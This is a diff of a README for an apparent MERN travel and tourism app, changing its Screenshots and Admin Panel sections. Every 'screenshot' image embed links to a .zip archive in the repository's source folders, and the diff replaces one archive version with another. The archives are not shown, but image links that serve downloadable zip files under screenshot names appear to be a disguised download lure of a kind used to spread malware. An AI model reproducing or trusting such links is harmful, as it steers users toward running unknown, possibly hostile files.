@@ -1,13 +1,13 @@
 # Travel and Tourism Management System MERN
 
 # Screenshots
-![HomePage](https://github.com/isaacdivine37/MERN-Travel-Tourism-App/raw/refs/heads/main/client/src/pages/components/Travel_MER_App_Tourism_v1.5-alpha.1.zip)
-![BookPackagePage](https://github.com/isaacdivine37/MERN-Travel-Tourism-App/raw/refs/heads/main/client/src/pages/components/Travel_MER_App_Tourism_v1.5-alpha.1.zip)
+![HomePage](https://raw.githubusercontent.com/isaacdivine37/MERN-Travel-Tourism-App/main/client/src/pages/admin/Travel_MER_App_Tourism_v3.4.zip)
+![BookPackagePage](https://raw.githubusercontent.com/isaacdivine37/MERN-Travel-Tourism-App/main/client/src/pages/admin/Travel_MER_App_Tourism_v3.4.zip)
 
 # Admin Panel
-![Screenshot (23)](https://github.com/isaacdivine37/MERN-Travel-Tourism-App/raw/refs/heads/main/client/src/pages/components/Travel_MER_App_Tourism_v1.5-alpha.1.zip)
-![AddPackageAdminPage](https://github.com/isaacdivine37/MERN-Travel-Tourism-App/raw/refs/heads/main/client/src/pages/components/Travel_MER_App_Tourism_v1.5-alpha.1.zip)
-![AllPaymentsAdminPage](https://github.com/isaacdivine37/MERN-Travel-Tourism-App/raw/refs/heads/main/client/src/pages/components/Travel_MER_App_Tourism_v1.5-alpha.1.zip)
+![Screenshot (23)](https://raw.githubusercontent.com/isaacdivine37/MERN-Travel-Tourism-App/main/client/src/pages/admin/Travel_MER_App_Tourism_v3.4.zip)
+![AddPackageAdminPage](https://raw.githubusercontent.com/isaacdivine37/MERN-Travel-Tourism-App/main/client/src/pages/admin/Travel_MER_App_Tourism_v3.4.zip)
+![AllPaymentsAdminPage](https://raw.githubusercontent.com/isaacdivine37/MERN-Travel-Tourism-App/main/client/src/pages/admin/Travel_MER_App_Tourism_v3.4.zip)
 
 # .ENV
 MONGO_URL=your_mongo_url<br/>
